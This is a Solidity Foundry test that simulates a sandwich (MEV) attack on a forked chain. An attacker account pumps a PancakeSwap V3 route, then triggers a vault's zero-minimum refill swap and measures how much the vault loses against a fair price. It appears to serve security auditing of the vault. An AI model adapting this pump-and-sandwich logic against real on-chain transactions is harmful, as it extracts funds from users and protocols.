// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
import "./Fork.t.sol";
contract Mev is ForkBase {
    function _swap(bytes memory p, uint256 bnb, address who) internal {
        vm.prank(who);
        IPancakeV3SwapRouter(0x1b81D678ffb9C0263b24A97847620C99d213eB14).exactInput{value: bnb}(
            IPancakeV3SwapRouter.ExactInputParams(p, who, block.timestamp, bnb, 0));
    }
    // attacker: pump -> trigger vault refill (minOut 0) -> measure what vault got vs fair
    function test_measure_sandwich_loss() public {
        fund(30 ether);
        address a = address(0xBAD1); vm.deal(a, 1000 ether);
        uint8[3] memory ds = [uint8(1), 2, 7];
        for (uint8 k = 0; k < 3; k++) {
            uint8 d = ds[k];
            (, bytes memory p,) = vault.districtRoute(d);
            uint256 fair = vault.fairStockOut(d, 1 ether);
            // binary-ish search: biggest pump that still lets refill pass
            uint256 lo = 0; uint256 hi = 400 ether; uint256 best;
            for (uint256 it = 0; it < 12; it++) {
                uint256 mid = (lo + hi) / 2;
                uint256 snap = vm.snapshotState();
                if (mid > 0) _swap(p, mid, a);
                vm.prank(a);
                try vault.refillViaSwap(d, 1 ether, 0) returns (uint256 got) { best = got; lo = mid; } catch { hi = mid; }
                vm.revertToState(snap);
            }
            emit log_named_uint(string.concat(names[d], " max pump BNB (1e16)"), lo / 1e16);
            emit log_named_uint(string.concat(names[d], " vault got/fair bps under attack"), best * 10000 / fair);
        }
    }
}
